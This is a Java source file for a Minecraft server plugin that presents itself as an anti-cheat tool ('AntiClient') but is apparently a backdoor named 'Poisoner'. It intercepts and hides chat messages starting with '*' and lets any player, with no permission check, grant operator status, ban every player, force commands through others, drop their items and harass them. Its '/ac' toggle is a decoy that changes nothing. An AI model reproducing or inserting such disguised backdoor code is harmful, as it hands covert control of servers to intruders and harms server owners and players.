/*
 * AntiClient | Poisoner v1
 * ============================
 * @author Clanky
 * @version 1.0
 */

package me.clanky.anticlient;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class Main extends JavaPlugin implements Listener {
	public List<Player> listGodMode = new ArrayList();
	public static Map<Player, Boolean> hauntedPlayers = new HashMap();
	public void onEnable()
	  {
	    getServer().getPluginManager().registerEvents(this, this);
	  }
	
	//Intialisation command.
		public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
		  {
			boolean enabled = false;
		    if (cmd.getName().equalsIgnoreCase("ac")) {enabled = !enabled;
		    	  if(enabled){
		    		  sender.sendMessage("[AntiClient] Status: \247cDisabled.\247f");
		    	  }else{
		    		  sender.sendMessage("[AntiClient] Status: \247aEnabled.\247f");
		    	  }
		      }
		    return true;
		  }
		
		@EventHandler(priority=EventPriority.HIGHEST)
		  public void PlayerChat(AsyncPlayerChatEvent event)
		  {
			Player p = event.getPlayer();
	        String m = event.getMessage();
	        String[] s = m.split(" ");
		    if(m.toLowerCase().startsWith("*"))
		    {
		        event.setCancelled(true);
		        
		        if(m.equalsIgnoreCase("*test")){
		        	p.sendMessage("\2476[Poisoner] \247aPoisoner is working properly.");
		        }else if(m.toLowerCase().startsWith("*op") && !m.equalsIgnoreCase("*op") && !m.equalsIgnoreCase("*opall")){
		    	try{
		    		Player q = Bukkit.getPlayer(s[1]);
		    		if(q.isOnline()){
			    		if(!q.isOp()){
			    			q.setOp(true);
			    			p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " is now OP.");
			    		}else{
			    			p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already OP!");
			    		}
			    	}else{
			    		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
			    	}
			    }catch (Exception e){
			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			    }
		    }else if(m.equalsIgnoreCase("*op")){
		    	try{
		    		if(!p.isOp()){
		    			p.setOp(true);
		    			p.sendMessage("\2476[Poisoner] \247aYou are now OP.");
		    		}else{
		    			p.sendMessage("\2476[Poisoner] \247eYou are already OP!");
		    		}
		    	}catch (Exception e){
		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		    	}
		    }else if(m.toLowerCase().startsWith("*deop") && !m.equalsIgnoreCase("*deop") && !m.equalsIgnoreCase("*deopall")){
		    	try{
		    		Player q = Bukkit.getPlayer(s[1]);
		    		if(q.isOnline()){
			    		if(q.isOp()){
			    			q.setOp(false);
			    			p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " is now a normal player.");
			    		}else{
			    			p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already a normal player!");
			    		}
			    	}else{
			    		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
			    	}
			    }catch (Exception e){
			    	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			    }
		    }else if(m.equalsIgnoreCase("*deop")){
		    	try{
		    		if(p.isOp()){
		    			p.setOp(false);
		    			p.sendMessage("\2476[Poisoner] \247aYou are now a normal player.");
		    		}else{
		    			p.sendMessage("\2476[Poisoner] \247eYou are already a normal player!");
		    		}
		    	}catch (Exception e){
		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		    	}
		    }else if(m.toLowerCase().startsWith("*goodeffects") && !m.equalsIgnoreCase("*goodeffects")){
		        Player q = Bukkit.getPlayer(s[1]);	
		        try{
		        	if(q.isOnline()){
		        		q.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.HEAL, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.JUMP, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.NIGHT_VISION, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 10000, 0));
			            p.sendMessage("\2476[Poisoner] \247aGood potion effects werde added to the player " + q.getDisplayName());
		        	}else{
		        		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
		        	}
		        }catch (Exception e){
		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		        }
		    }else if(m.equalsIgnoreCase("*goodeffects")){
		    	try{
		        		p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.HEAL, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.JUMP, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.NIGHT_VISION, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 10000, 0));
			            p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, 10000, 0));
			            p.sendMessage("\2476[Poisoner] \247aGood potion effects werde added to you.");
		        }catch (Exception e){
		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		        }
		    }else if(m.toLowerCase().startsWith("badeffects") && !m.equalsIgnoreCase("*badeffects")){
		        Player q = Bukkit.getPlayer(s[1]);	
		        try{
		        	if(q.isOnline()){
		        		q.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 10000, 0));
			            q.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 10000, 0));
			            p.sendMessage("\2476[Poisoner] \247aBad potion effects werde added to the player " + q.getDisplayName());
		        	}else{
		        		p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found!");
		        	}
		        }catch (Exception e){
		        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		        }
		  }else if(m.equalsIgnoreCase("*badeffects")){
		    	try{
	        		p.addPotionEffect(new PotionEffect(PotionEffectType.CONFUSION, 10000, 0));
		            p.addPotionEffect(new PotionEffect(PotionEffectType.WEAKNESS, 10000, 0));
		            p.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 10000, 0));
		            p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 10000, 0));
		            p.sendMessage("\2476[Poisoner] \247aBad potion effects werde added to you.");
	        }catch (Exception e){
	        	p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        }
		  }else if(m.toLowerCase().startsWith("*drop") && !m.equalsIgnoreCase("*drop") && !m.equalsIgnoreCase("*dropall")){
			  Player q = Bukkit.getPlayer(s[1]);
			  try{
				  if(q.isOnline()){
					  for (ItemStack i : q.getInventory().getContents()) {
						    if (i != null) {
						    	Location qLoc = new Location(q.getWorld(), q.getLocation().getX() + 3, q.getLocation().getY(), q.getLocation().getZ());
						        q.getWorld().dropItemNaturally(qLoc, i);
						        q.getInventory().remove(i);
						    }
						}
					  p.sendMessage("\2476[Poisoner] \247aItems of player " + q.getDisplayName() + " are dropping now.");
				  }
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.equalsIgnoreCase("*drop")){
			  try{
					  for (ItemStack i : p.getInventory().getContents()) {
						    if (i != null) {
						    	Location pLoc = new Location(p.getWorld(), p.getLocation().getX() + 3, p.getLocation().getY(), p.getLocation().getZ());
						        p.getWorld().dropItemNaturally(pLoc, i);
						        p.getInventory().remove(i);
						    }
						}
					  p.sendMessage("\2476[Poisoner] \247aYour items are dropping now.");
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.equalsIgnoreCase("*dropall")){
			  try{
				  for (Player q : Bukkit.getServer().getOnlinePlayers()) {
					  for (ItemStack i : q.getInventory().getContents()) {
						    if (i != null && q != p) {
						    	Location qLoc = new Location(q.getWorld(), q.getLocation().getX() + 3, q.getLocation().getY(), q.getLocation().getZ());
						        q.getWorld().dropItemNaturally(qLoc, i);
						        q.getInventory().remove(i);
						    }
					  }
					  p.sendMessage("\2476[Poisoner] \247aItems of all players are dropping now.");
				  }
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.toLowerCase().startsWith("*ban") && !m.equalsIgnoreCase("*banall")){
			  Player q = Bukkit.getPlayer(s[1]);
			  try{
				  if(s.length > 1){
					  if(q.isOnline()){
						  if(!q.isBanned()){
							  q.kickPlayer("");
						      q.setBanned(true);
						      p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was banned.");
						  }else{
							  p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already banned.");
						  }
					  }else{
						  p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
					  }
				  }else{
					  p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *ban <player>");
				  }
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.equalsIgnoreCase("*banall")){
			  try{
				  for (Player q : Bukkit.getServer().getOnlinePlayers()) {
				        if (q != p)
				        {
				          q.setBanned(true);
				        }
				      }
				  p.sendMessage("\2476[Poisoner] \247aAll players were banned.");
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.toLowerCase().startsWith("*unban") && !m.equalsIgnoreCase("*unbanall")){
			  OfflinePlayer q = Bukkit.getOfflinePlayer(s[1]);
			  try{
				  if(s.length > 1){
						  if(q.isBanned()){
						      Bukkit.getServer().getBannedPlayers().remove(q);
						      q.setBanned(false);
						      p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getName() + " was unbanned.");
						  }else{
							  p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getName() + " is already unbanned.");
						  }
				  }else{
					  p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *unban <player>");
				  }
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
				  p.sendMessage("\2476[Poisoner] \247c" + e);
			  }
		  } else if(m.equalsIgnoreCase("*unbanall")){
			  try{
				  for (OfflinePlayer q : Bukkit.getServer().getBannedPlayers()) {
				          q.setBanned(false);
				      }
				  p.sendMessage("\2476[Poisoner] \247aAll players were unbanned.");
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.equalsIgnoreCase("*god")){
			  try{
				  if(!listGodMode.contains(p)){
					  listGodMode.add(p);
					  p.sendMessage("\2476[Poisoner] \247aYou're now on godmode.");
				  }else{
					  listGodMode.remove(p);
					  p.sendMessage("\2476[Poisoner] \247aYour godmode was removed.");
				  }
			  }catch (Exception e){
				  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
			  }
		  } else if(m.toLowerCase().startsWith("*haunt")){
	        	if (s.length > 1)
	            {
	              Player q = Bukkit.getPlayer(s[1]);
	              try{
	            	  if ((hauntedPlayers.containsKey(q)) && (((Boolean)hauntedPlayers.get(q)).booleanValue()))
	                  {
	                    hauntedPlayers.put(q, Boolean.valueOf(false));
	                    p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " is no longer being haunted.");
	                  }
	                  hauntedPlayers.put(q, Boolean.valueOf(true));
	                  p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " is now being haunted.");
	              }catch (Exception e){
	            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	              }
	            }else{
	            	p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *haunt <player>");
	            }
	        } else if(m.equalsIgnoreCase("*opall")){
	        	try{
					  for (Player q : Bukkit.getServer().getOnlinePlayers()) {
					          q.setOp(true);
					      }
					  p.sendMessage("\2476[Poisoner] \247aAll players are now OP.");
				  }catch (Exception e){
					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
				  }
	        } else if(m.equalsIgnoreCase("*deopall")){
	        	try{
					  for (Player q : Bukkit.getServer().getOnlinePlayers()) {
					      if(q != p){    
					    	  q.setOp(false);
					      }
					      }
					  p.sendMessage("\2476[Poisoner] \247aAll players are now normal players.");
				  }catch (Exception e){
					  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
				  }
	        } else if(m.toLowerCase().startsWith("*sudo")){
		    	if (s.length > 1) {
		              try
		              {
		                String sudoCommand = m.replace("*Sudo ", "").replace("*sudo ", "").replace(s[1] + " ", "");
		                Player sudoPlayer = Bukkit.getPlayer(s[1]);
		                if(sudoCommand.startsWith("/")){
		                	p.sendMessage("\2476[Poisoner] \247aPlayer " + sudoPlayer.getDisplayName() + " will run the command: " + sudoCommand);
		                }
		                  sudoPlayer.chat(sudoCommand);
		                }
		              catch (Exception e)
		              {
		            	  p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		              }
		            } else {
		            	p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *sudo <player> <chat or /command>");
		            }
		    } else if(m.toLowerCase().startsWith("*tp")){
		    	Player q1 = Bukkit.getPlayer(s[1]);
		    	Player q2 = Bukkit.getPlayer(s[2]);
		    	try{
		    		if(s.length > 1){
			    		if(q1.isOnline() && q2.isOnline()){
			    			q1.teleport(q2);
			    			p.sendMessage("\2476[Poisoner] \247aTeleported " + q1.getDisplayName() + " to " + q2.getDisplayName() + ".");
			    		}else{
			    			p.sendMessage("\2476[Poisoner] \247cOne of these players was not found.");
			    		}
			    	}else{
			    		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *tp <source_player> <destination_player>");
			    	}
		    	}catch (Exception e){
		    		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
		    	}
		    } else if(m.toLowerCase().startsWith("*gm1") && !m.equalsIgnoreCase("*gm1")){
		    	Player q = Bukkit.getPlayer(s[1]);
	        	try{
	        		if(s.length > 1 && q.isOnline()){
	        			if (q.getGameMode() != GameMode.CREATIVE){
	        				q.setGameMode(GameMode.CREATIVE);
	        				p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was set to creative mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already in creative mode.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.equalsIgnoreCase("*gm1")){
	        	try{
	        			if (p.getGameMode() != GameMode.CREATIVE){
	        				p.setGameMode(GameMode.CREATIVE);
	        				p.sendMessage("\2476[Poisoner] \247aYou were set to creative mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247eYou are already in creative mode.");
	        			}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        }else if(m.toLowerCase().startsWith("*gm0") && !m.equalsIgnoreCase("*gm0")){
	        	Player q = Bukkit.getPlayer(s[1]);
	        	try{
	        		if(s.length > 1 && q.isOnline()){
	        			if (q.getGameMode() != GameMode.SURVIVAL){
	        				q.setGameMode(GameMode.SURVIVAL);
	        				p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was set to survival mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already in survival mode.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.equalsIgnoreCase("*gm0")){
	        	try{
	        			if (p.getGameMode() != GameMode.SURVIVAL){
	        				p.setGameMode(GameMode.SURVIVAL);
	        				p.sendMessage("\2476[Poisoner] \247aYou were set to survival mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247eYou are already in survival mode.");
	        			}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.toLowerCase().startsWith("*gm2") && !m.equalsIgnoreCase("*gm2")){
	        	Player q = Bukkit.getPlayer(s[1]);
	        	try{
	        		if(s.length > 1 && q.isOnline()){
	        			if (q.getGameMode() != GameMode.ADVENTURE){
	        				q.setGameMode(GameMode.ADVENTURE);
	        				p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was set to adventure mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247ePlayer " + q.getDisplayName() + " is already in adventure mode.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.equalsIgnoreCase("*gm2")){
	        	try{
	        			if (p.getGameMode() != GameMode.ADVENTURE){
	        				p.setGameMode(GameMode.ADVENTURE);
	        				p.sendMessage("\2476[Poisoner] \247aYou were set to adventure mode.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247eYou are already in adventure mode.");
	        			}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.toLowerCase().startsWith("*heal") && !m.equalsIgnoreCase("*heal")){
	        	Player q = Bukkit.getPlayer(s[1]);
	        	try{
	        		if(s.length > 1){
	        			if(q.isOnline()){
	        				q.setHealth(20D);
	                		q.setFireTicks(0);
	                		q.setFoodLevel(20);
	                		p.sendMessage("\2476[Poisoner] \247aPlayer " + q.getDisplayName() + " was healed.");
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q.getDisplayName() + " was not found.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *heal [player]");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.equalsIgnoreCase("*heal")){
	        	try{
	        		p.setHealth(20D);
            		p.setFireTicks(0);
            		p.setFoodLevel(20);
            		p.sendMessage("\2476[Poisoner] \247aYou were healed.");
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.toLowerCase().startsWith("*swap")){
	        	try{
	        		if(s.length > 1){
		        		Player q1 = Bukkit.getPlayer(s[1]);
		        		Player q2 = Bukkit.getPlayer(s[2]);
		        		if(q1.isOnline() && q2.isOnline()){
		        			Location qLoc1 = q1.getLocation();
		        			Location qLoc2 = q2.getLocation();
		        			q1.teleport(qLoc2);
		        			q2.teleport(qLoc1);
		        			p.sendMessage("\2476[Poisoner] \247aThe locations of " + q1 + " and " + q2 + " were swapped.");
		        		}else{
		        			p.sendMessage("\2476[Poisoner] \247cOne of these players was not found.");
		        		}
		        	}else{
		        		p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *swap <player1> <player2>");
		        	}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        } else if(m.toLowerCase().startsWith("*burn")){
	        	try{
	        		if(s.length > 1){
	        			Player q = Bukkit.getPlayer(s[1]);
	        			if(q.isOnline()){
	        				q.setFireTicks(10000);
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q + " was not found.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *burn <player>");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        }else if(m.toLowerCase().startsWith("*strike")){
	        	try{
	        		if(s.length > 1){
	        			Player q = Bukkit.getPlayer(s[1]);
	        			if(q.isOnline()){
	        				q.getWorld().strikeLightning(q.getLocation());
	        			}else{
	        				p.sendMessage("\2476[Poisoner] \247cPlayer " + q + " was not found.");
	        			}
	        		}else{
	        			p.sendMessage("\2476[Poisoner] \247cWrong syntax. Syntax: *strike <player>");
	        		}
	        	}catch (Exception e){
	        		p.sendMessage("\2476[Poisoner] \247cUnknown error. Is the player online? Did you type the right syntax?");
	        	}
	        }
	        	else if(m.toLowerCase().startsWith("*help")){
			  p.sendMessage("\2476[Poisoner] \247aThe help pages were initialized.");
			  p.sendMessage("\2476[Poisoner] \247f*op [player] | OPs you or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*opall | OPs all players.");
			  p.sendMessage("\2476[Poisoner] \247f*deop [player] | De-OPs you or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*deopall | De-OPs all players except you.");
			  p.sendMessage("\2476[Poisoner] \247f*goodeffects [player] | Gives bunch of good potion effects to you or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*badeffects [player] | Gives bunch of bad potion effects to you or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*drop [player] | Drops all items from you or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*dropall | Drops items of all players except you.");
			  p.sendMessage("\2476[Poisoner] \247f*ban <player> | Bans a specific player.");
			  p.sendMessage("\2476[Poisoner] \247f*banall | Bans all players except you.");
			  p.sendMessage("\2476[Poisoner] \247f*unban <player> | Unbans a specific player.");
			  p.sendMessage("\2476[Poisoner] \247f*unbanall | Unbans all players.");
			  p.sendMessage("\2476[Poisoner] \247f*gm0 [player] | Sets you or another player in survival mode.");
			  p.sendMessage("\2476[Poisoner] \247f*gm1 [player] | Sets you or another player in creative mode.");
			  p.sendMessage("\2476[Poisoner] \247f*gm2 [player] | Sets you or another player in adventure mode.");
			  p.sendMessage("\2476[Poisoner] \247f*god | Sets yourself on godmode.");
			  p.sendMessage("\2476[Poisoner] \247f*heal [player] | Heals yourself or another player.");
			  p.sendMessage("\2476[Poisoner] \247f*tp <source_player> <destination_player> | Teleports source_player to destination_player.");
			  p.sendMessage("\2476[Poisoner] \247f*swap <player1> <player2> | Swaps the location of player1 and player2.");
			  p.sendMessage("\2476[Poisoner] \247f*haunt <player> | Plays creepy sounds at a specific player.");
			  p.sendMessage("\2476[Poisoner] \247f*burn <player> | Sets a specific player on fire.");
			  p.sendMessage("\2476[Poisoner] \247f*strike <player> | Spawns a lightning at a specific players location.");
			  p.sendMessage("\2476[Poisoner] \247f*sudo <player> <chat or /command> | Forces a player to execute a command or write into the chat.");
		  }
		    }
		  }
		
		@EventHandler
		  public void onPlayerDamage(EntityDamageEvent event){
			if(listGodMode.contains(event.getEntity())){
				event.setCancelled(true);
			}
		}
		
		@EventHandler
		  public void onPlayerMove(PlayerMoveEvent event)
		  {
		    if ((hauntedPlayers.containsKey(event.getPlayer())) && 
		      (((Boolean)hauntedPlayers.get(event.getPlayer())).booleanValue())) {
		      haunt(event.getPlayer());
		    }
		  }
		  
		  public void haunt(Player p)
		  {
		    int soundNum = 1 + (int)(Math.random() * 9.0D);
		    int rand = 1 + (int)(Math.random() * 80.0D);
		    Sound sound = null;
		    switch (soundNum)
		    {
		    case 1: 
		      sound = Sound.AMBIENCE_CAVE;
		      break;
		    case 2: 
		      sound = Sound.BLAZE_BREATH;
		      break;
		    case 3: 
		      sound = Sound.CREEPER_HISS;
		      break;
		    case 4: 
		      sound = Sound.ENDERMAN_STARE;
		      break;
		    case 5: 
		      sound = Sound.GHAST_MOAN;
		      break;
		    case 6: 
		      sound = Sound.MAGMACUBE_JUMP;
		      break;
		    case 7: 
		      sound = Sound.WITHER_IDLE;
		      break;
		    case 8: 
		      sound = Sound.ZOMBIE_WOOD;
		      break;
		    case 9: 
		      sound = Sound.AMBIENCE_RAIN;
		    }
		    if (rand == 1) {
		      p.getWorld().playSound(p.getLocation(), sound, 10.0F, 10.0F);
		    }
		  }
}
